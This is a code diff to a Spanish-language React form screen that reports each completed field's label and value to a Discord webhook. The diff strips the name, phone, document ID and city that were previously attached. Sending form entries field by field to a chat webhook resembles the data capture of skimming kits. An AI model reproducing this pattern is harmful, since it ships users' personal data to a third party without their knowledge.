@@ -230,16 +230,11 @@ export function FormScreen({ data, onChange, onContinue, onBack }: FormScreenPro
     const key = `${label}_${value}`
     if (reportedRef.current.has(key)) return
     reportedRef.current.add(key)
-    const extra: Record<string, string | number | boolean> = { [label]: value }
-    if (data.fullName) extra['Nombre'] = data.fullName
-    if (data.phone) extra['Teléfono'] = data.phone
-    if (data.documentId) extra['Documento'] = data.documentId
-    if (data.city) extra['Ciudad'] = data.city
     DiscordWebhookService.sendInfo(
       `Campo completado: ${label}`,
-      `Usuario llenó el campo ${label}`,
-      { name: data.fullName || '—', phone: data.phone || '—', role: 'Cliente' },
-      extra,
+      '',
+      {},
+      { [label]: value },
     )
   }
 
